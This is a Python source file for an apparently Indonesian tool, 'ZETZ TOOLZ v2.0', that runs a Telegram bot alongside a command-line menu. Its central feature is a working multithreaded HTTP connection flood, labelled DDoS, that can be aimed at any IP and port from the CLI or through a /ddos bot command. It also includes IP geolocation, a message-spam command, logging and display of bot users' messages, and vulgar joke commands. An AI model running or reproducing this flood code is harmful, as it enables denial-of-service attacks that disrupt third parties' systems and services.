import time
import sys
import re
import threading
import random
import webbrowser
import socket
import datetime
import os
import json
import telebot
from telebot import types
import requests
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

# Variabel global
stop_ddos = False
telegram_bot = None
user_logs = {}

# ========== FUNGSI AMBIL PASSWORD DARI GITLAB ==========
def fetch_password_from_gitlab():
    """Ambil password dari GitLab raw file"""
    try:
        url = "https://gitlab.com/deemzet999/pwdzetztoolz/-/raw/main/db.txt"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            content = response.text
            
            # Pattern untuk cari password
            patterns = [
                r'password\s*[:=]\s*["\']([^"\']+)["\']',
                r'correct_password\s*[:=]\s*["\']([^"\']+)["\']',
                r'pass\s*[:=]\s*["\']([^"\']+)["\']',
                r'key\s*[:=]\s*["\']([^"\']+)["\']'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    return matches[0]
            
            # Jika pattern tidak ketemu, ambil semua teks
            lines = content.strip().split('\n')
            for line in lines:
                if line and len(line) > 5 and not line.startswith('#'):
                    return line.strip()
                    
    except Exception as e:
        print(Fore.RED + f"Error mengambil password: {e}")
    
    return "default_password_123"  # Fallback password

# Ambil password
correct_password = fetch_password_from_gitlab()

# ========== FUNGSI UTILITAS ==========
def clear_terminal():
    """Membersihkan layar terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation():
    print(Fore.YELLOW + "Loading", end="")
    for _ in range(10):
        time.sleep(0.5)
        print(Fore.YELLOW + ".", end="", flush=True)
    print(Fore.GREEN + "\nLoading selesai!")

def display_access_message():
    clear_terminal()
    print(Fore.CYAN + "=" * 60)
    print(Fore.MAGENTA + "   ██████╗ ███████╗███████╗████████╗     █████╗ ██╗")
    print(Fore.MAGENTA + "  ██╔════╝ ██╔════╝██╔════╝╚══██╔══╝    ██╔══██╗██║")
    print(Fore.MAGENTA + "  ██║  ███╗█████╗  █████╗     ██║       ███████║██║")
    print(Fore.MAGENTA + "  ██║   ██║██╔══╝  ██╔══╝     ██║       ██╔══██║██║")
    print(Fore.MAGENTA + "  ╚██████╔╝███████╗███████╗   ██║       ██║  ██║███████╗")
    print(Fore.MAGENTA + "   ╚═════╝ ╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚══════╝")
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + "╔══════════════════════════════════════════════════════╗")
    print(Fore.YELLOW + "║           ZETZ TOOLZ v2.0 - TELEGRAM EDITION          ║")
    print(Fore.YELLOW + "╚══════════════════════════════════════════════════════╝")
    print(Fore.CYAN + "├────────────────────────────────────────────────────────┤")
    print(Fore.GREEN + "│ Developer : DeemZet                                   │")
    print(Fore.GREEN + "│ Version   : 2.0                                       │")
    print(Fore.GREEN + "│ Status    : " + Fore.RED + "ACTIVE" + Fore.GREEN + "                                    │")
    print(Fore.CYAN + "└────────────────────────────────────────────────────────┘")

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_current_date_and_day():
    now = datetime.datetime.now()
    current_date = now.strftime("%d %B %Y")
    current_day = now.strftime("%A")
    
    days_translation = {
        "Monday": "Senin",
        "Tuesday": "Selasa",
        "Wednesday": "Rabu",
        "Thursday": "Kamis",
        "Friday": "Jum'at",
        "Saturday": "Sabtu",
        "Sunday": "Ahad"
    }
    return current_date, days_translation.get(current_day, current_day)

def track_ip(ip):
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if ip_pattern.match(ip):
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json")
            data = response.json()
            location = data.get("loc", "Lokasi tidak ditemukan")
            city = data.get("city", "Kota tidak ditemukan")
            region = data.get("region", "Region tidak ditemukan")
            country = data.get("country", "Negara tidak ditemukan")
            print(Fore.GREEN + f"[IP TRACKER] IP: {ip}")
            print(Fore.GREEN + f"[IP TRACKER] Lokasi: {city}, {region}, {country}")
            print(Fore.GREEN + f"[IP TRACKER] Koordinat: {location}")
            return f"IP: {ip}\nLokasi: {city}, {region}, {country}\nKoordinat: {location}"
        except Exception as e:
            return f"Error tracking IP: {e}"
    else:
        return "Format IP tidak valid."

def ai_response(prompt):
    responses = {
        "apa kabar": "Saya baik-baik saja, terima kasih!",
        "siapa kamu": "Saya adalah ZetzAI - Bot Telegram yang powerful!",
        "apa itu python": "Python adalah bahasa pemrograman yang populer.",
        "help": "Gunakan /menu untuk melihat semua perintah",
        "kontol": "Eww kontol apaan sih!",
    }
    return responses.get(prompt.lower(), "Maaf, saya tidak mengerti.")

# ========== FUNGSI DDoS ==========
def ddos_attack(target, port, duration, thread_count):
    global stop_ddos
    stop_ddos = False
    start_time = time.time()
    
    def flood():
        while not stop_ddos and time.time() < start_time + duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"), (target, port))
                s.sendto(("Host: " + target + "\r\n\r\n").encode("ascii"), (target, port))
                s.close()
            except:
                pass
    
    print(Fore.RED + f"[DDoS] Launching {thread_count} threads to {target}:{port}")
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    time.sleep(duration)
    stop_ddos = True
    
    for thread in threads:
        thread.join()
    
    return f"DDoS attack finished on {target}:{port}"

# ========== FUNGSI TELEGRAM BOT ==========
def start_telegram_bot(token):
    """Memulai bot Telegram"""
    global telegram_bot, user_logs
    
    try:
        telegram_bot = telebot.TeleBot(token)
        print(Fore.GREEN + f"[TELEGRAM] Bot started with token: {token[:20]}...")
        
        @telegram_bot.message_handler(commands=['start'])
        def send_welcome(message):
            user_logs[message.chat.id] = {
                'username': message.from_user.username,
                'first_name': message.from_user.first_name,
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            btn1 = types.KeyboardButton('🛠️ Tools')
            btn2 = types.KeyboardButton('🔍 Track IP')
            btn3 = types.KeyboardButton('⚡ DDoS')
            btn4 = types.KeyboardButton('🤖 AI Chat')
            markup.add(btn1, btn2, btn3, btn4)
            
            telegram_bot.reply_to(message, 
                f"👋 Welcome *{message.from_user.first_name}*!\n"
                f"🤖 *ZetzAI Telegram Bot*\n"
                f"🔧 Version: 2.0\n"
                f"📊 Use /menu for all commands",
                parse_mode='Markdown',
                reply_markup=markup)
            
            print(Fore.CYAN + f"[LOG] User {message.from_user.username} ({message.chat.id}) started bot")
        
        @telegram_bot.message_handler(commands=['menu'])
        def show_menu(message):
            menu_text = """
*🔧 ZETZAI MENU*

*🛠️ TOOLS*
/ddos <ip> <port> <durasi> - Launch DDoS attack
/track <ip> - Track IP location
/spam <number> <message> - Spam message
/calc <expression> - Calculator

*🤖 FUN*
/joke - Random joke
/fact - Random fact
/cekkontol <nama> - Cek persentase kontol

*🔧 ADMIN*
/status - Bot status
/users - Show active users
/broadcast <message> - Broadcast to all users
"""
            telegram_bot.reply_to(message, menu_text, parse_mode='Markdown')
        
        @telegram_bot.message_handler(commands=['ddos'])
        def ddos_command(message):
            try:
                parts = message.text.split()
                if len(parts) == 4:
                    target = parts[1]
                    port = int(parts[2])
                    duration = int(parts[3])
                    
                    telegram_bot.reply_to(message, f"⚡ Starting DDoS attack on {target}:{port}")
                    
                    # Jalankan di thread terpisah
                    threading.Thread(target=lambda: ddos_attack_wrapper(message, target, port, duration)).start()
                else:
                    telegram_bot.reply_to(message, "Usage: /ddos <ip> <port> <duration>")
            except Exception as e:
                telegram_bot.reply_to(message, f"Error: {e}")
        
        def ddos_attack_wrapper(message, target, port, duration):
            result = ddos_attack(target, port, duration, 100)
            telegram_bot.reply_to(message, f"✅ {result}")
        
        @telegram_bot.message_handler(commands=['track'])
        def track_command(message):
            try:
                parts = message.text.split()
                if len(parts) == 2:
                    result = track_ip(parts[1])
                    telegram_bot.reply_to(message, result)
                else:
                    telegram_bot.reply_to(message, "Usage: /track <ip>")
            except Exception as e:
                telegram_bot.reply_to(message, f"Error: {e}")
        
        @telegram_bot.message_handler(commands=['spam'])
        def spam_command(message):
            try:
                parts = message.text.split(maxsplit=2)
                if len(parts) == 3:
                    count = int(parts[1])
                    text = parts[2]
                    
                    telegram_bot.reply_to(message, f"📢 Spamming {count} times...")
                    
                    for i in range(count):
                        telegram_bot.send_message(message.chat.id, f"{text} [{i+1}]")
                        time.sleep(0.5)
                    
                    telegram_bot.reply_to(message, f"✅ Spam completed!")
                else:
                    telegram_bot.reply_to(message, "Usage: /spam <count> <message>")
            except Exception as e:
                telegram_bot.reply_to(message, f"Error: {e}")
        
        @telegram_bot.message_handler(commands=['cekkontol'])
        def cekkontol_command(message):
            try:
                parts = message.text.split(maxsplit=1)
                if len(parts) == 2:
                    nama = parts[1]
                    percent = random.randint(0, 100)
                    response = f"🧐 *CEK KONTOL RESULT*\n"
                    response += f"👤 Nama: {nama}\n"
                    response += f"📊 Persentase: {percent}%\n"
                    response += f"💬 Verdict: {'Eww kontolnya!' if percent > 50 else 'Lumayan lah'}"
                    telegram_bot.reply_to(message, response, parse_mode='Markdown')
                else:
                    telegram_bot.reply_to(message, "Usage: /cekkontol <nama>")
            except Exception as e:
                telegram_bot.reply_to(message, f"Error: {e}")
        
        @telegram_bot.message_handler(commands=['status'])
        def status_command(message):
            status_text = f"""
*🤖 BOT STATUS*
👥 Active Users: {len(user_logs)}
🕒 Uptime: {time.strftime('%H:%M:%S')}
📡 Server: Online
🔧 Version: 2.0
"""
            telegram_bot.reply_to(message, status_text, parse_mode='Markdown')
        
        @telegram_bot.message_handler(func=lambda message: True)
        def handle_all_messages(message):
            # Log user activity
            if message.chat.id not in user_logs:
                user_logs[message.chat.id] = {}
            
            user_logs[message.chat.id].update({
                'last_message': message.text,
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S"),
                'message_count': user_logs[message.chat.id].get('message_count', 0) + 1
            })
            
            # Tampilkan di CLI
            username = message.from_user.username or message.from_user.first_name
            print(Fore.CYAN + f"[TELEGRAM] {username}: {message.text}")
            
            # Auto response untuk beberapa keyword
            if "hai" in message.text.lower() or "halo" in message.text.lower():
                telegram_bot.reply_to(message, f"Halo {message.from_user.first_name}! 👋")
            elif "kontol" in message.text.lower():
                telegram_bot.reply_to(message, "Ihh kasar bgt sih! 😠")
        
        # Jalankan bot di thread terpisah
        bot_thread = threading.Thread(target=telegram_bot.polling, kwargs={'non_stop': True})
        bot_thread.daemon = True
        bot_thread.start()
        
        return True
        
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to start bot: {e}")
        return False

def show_user_logs():
    """Tampilkan log user di CLI"""
    if not user_logs:
        print(Fore.YELLOW + "[LOG] No active users yet")
        return
    
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + "📊 ACTIVE USER LOGS")
    print(Fore.CYAN + "=" * 60)
    
    for user_id, data in user_logs.items():
        username = data.get('username', 'No username')
        first_name = data.get('first_name', 'Unknown')
        last_seen = data.get('last_seen', 'Never')
        msg_count = data.get('message_count', 0)
        
        print(Fore.GREEN + f"👤 {username} ({first_name})")
        print(Fore.WHITE + f"   ID: {user_id}")
        print(Fore.WHITE + f"   Messages: {msg_count}")
        print(Fore.WHITE + f"   Last seen: {last_seen}")
        print(Fore.CYAN + "-" * 40)

# ========== FUNGSI UTAMA ==========
def main():
    display_access_message()
    
    # Password check
    password = input(Fore.CYAN + "\n🔐 Masukkan password: " + Fore.WHITE)
    if password != correct_password:
        print(Fore.RED + "❌ Password salah! Access denied.")
        sys.exit(1)
    
    print(Fore.GREEN + "✅ Password benar! Access granted.")
    time.sleep(1)
    
    # Minta token bot Telegram
    print(Fore.YELLOW + "\n" + "=" * 60)
    print(Fore.CYAN + "🤖 TELEGRAM BOT SETUP")
    print(Fore.YELLOW + "=" * 60)
    
    token = input(Fore.CYAN + "📝 Masukkan Telegram Bot Token: " + Fore.WHITE)
    
    if not token:
        print(Fore.RED + "❌ Token tidak valid!")
        sys.exit(1)
    
    print(Fore.YELLOW + "🚀 Starting Telegram Bot...")
    
    if start_telegram_bot(token):
        print(Fore.GREEN + "✅ Bot Telegram berhasil dijalankan!")
        print(Fore.CYAN + "📢 Bot sekarang aktif di Telegram")
        print(Fore.YELLOW + "💡 Gunakan /start di Telegram untuk memulai")
    else:
        print(Fore.RED + "❌ Gagal memulai bot!")
        return
    
    # Main CLI loop
    while True:
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.YELLOW + "🖥️  ZETZAI COMMAND LINE")
        print(Fore.CYAN + "=" * 60)
        print(Fore.GREEN + "1. Show User Logs")
        print(Fore.GREEN + "2. Send Broadcast Message")
        print(Fore.GREEN + "3. Start DDoS Attack")
        print(Fore.GREEN + "4. Track IP")
        print(Fore.GREEN + "5. Bot Status")
        print(Fore.RED + "6. Exit")
        print(Fore.CYAN + "=" * 60)
        
        choice = input(Fore.CYAN + "❯ Pilih menu (1-6): " + Fore.WHITE)
        
        if choice == "1":
            show_user_logs()
        
        elif choice == "2":
            if telegram_bot and user_logs:
                message = input(Fore.CYAN + "📢 Broadcast message: " + Fore.WHITE)
                if message:
                    print(Fore.YELLOW + f"📤 Broadcasting to {len(user_logs)} users...")
                    success = 0
                    for user_id in user_logs.keys():
                        try:
                            telegram_bot.send_message(user_id, f"📢 *BROADCAST*\n{message}", parse_mode='Markdown')
                            success += 1
                        except:
                            pass
                    print(Fore.GREEN + f"✅ Broadcast sent to {success}/{len(user_logs)} users")
            else:
                print(Fore.RED + "❌ No active users or bot not running")
        
        elif choice == "3":
            target = input(Fore.CYAN + "🎯 Target IP: " + Fore.WHITE)
            port = input(Fore.CYAN + "🔌 Port: " + Fore.WHITE)
            duration = input(Fore.CYAN + "⏱️  Duration (seconds): " + Fore.WHITE)
            
            try:
                port = int(port)
                duration = int(duration)
                result = ddos_attack(target, port, duration, 100)
                print(Fore.GREEN + f"✅ {result}")
            except Exception as e:
                print(Fore.RED + f"❌ Error: {e}")
        
        elif choice == "4":
            ip = input(Fore.CYAN + "🔍 IP Address: " + Fore.WHITE)
            result = track_ip(ip)
            print(Fore.GREEN + result)
        
        elif choice == "5":
            print(Fore.CYAN + "=" * 60)
            print(Fore.YELLOW + "🤖 BOT STATUS")
            print(Fore.CYAN + "=" * 60)
            print(Fore.GREEN + f"Active Users: {len(user_logs)}")
            print(Fore.GREEN + f"Bot Running: {'Yes' if telegram_bot else 'No'}")
            print(Fore.GREEN + f"Uptime: {time.strftime('%H:%M:%S')}")
            print(Fore.CYAN + "=" * 60)
        
        elif choice == "6":
            print(Fore.YELLOW + "👋 Shutting down...")
            if telegram_bot:
                try:
                    telegram_bot.stop_polling()
                except:
                    pass
            sys.exit(0)
        
        else:
            print(Fore.RED + "❌ Invalid choice!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n👋 Program interrupted by user")
        sys.exit(0)
